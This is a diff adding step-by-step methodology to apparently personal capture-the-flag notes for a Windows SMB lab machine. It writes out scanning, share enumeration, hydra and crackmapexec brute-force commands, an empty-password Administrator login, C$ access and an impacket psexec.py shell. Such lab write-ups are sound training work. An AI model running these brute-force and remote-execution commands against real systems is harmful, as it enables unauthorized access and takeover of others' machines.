@@ -658,10 +658,21 @@ will achieve remote code execution.
 Which Nmap switch can we use to enumerate machines when our ping ICMP packets are blocked by the Windows firewall?
 
 ### Methodology
-1.
-
-
-
+1. Nmap scan of system `nmap -sC -sV -p- --min-rate 1000 "Target_IP"
+2. No, hosts are up. Using `-Pn` switch to automatically assume host is up.
+3. Research SMB, SMB = server message block (SMB (Server Message Block) is a network protocol used for sharing files, printers, and other resources between computers, primarily in Windows environments.)
+4. SMB operates on port 445 on most modern systems
+5. Understand how to connect and use SMB
+6. Use `smbclient` to connect to SMB `smbclient -L //TARGET_IP -U username` (Can use "anonymous" for username) (`-L` means to list available shares)
+7. Enumerate SMB, can use `enum4linux`, `enum4linux-ng` or nmap scripts `nmap -p 445 --script smb-enum-shares,smb-enum-users TARGET_IP`
+8. To brute force logins, you can use `hydra` --> `hydra -L users.txt -P passwords.txt smb://TARGET_IP` or `crackmapexec` --> `crackmapexec smb TARGET_IP -u users.txt -p passwords.txt`
+9. Login with "Administrator" and empty password successful.
+10. Connect to unprotected share `C$` --> `smbclient //TARGET_IP/C$ -U administrator`
+11. Also I achieved connection with "impacket's" `psexec.py` --> `python3 /home/kali/.local/share/pipx/venvs/netexec/bin/psexec.py administrator:@TargetIP`
+12. Connection successful on both attempts, navigate system using windows commands.
+13. Find flag: `dir = ls`, `cd = cd`, `type = cat`, `get filename = cp "filename" .`
+14. `Flag Captured`
+15. Machine Pwned
 
 * * *
 
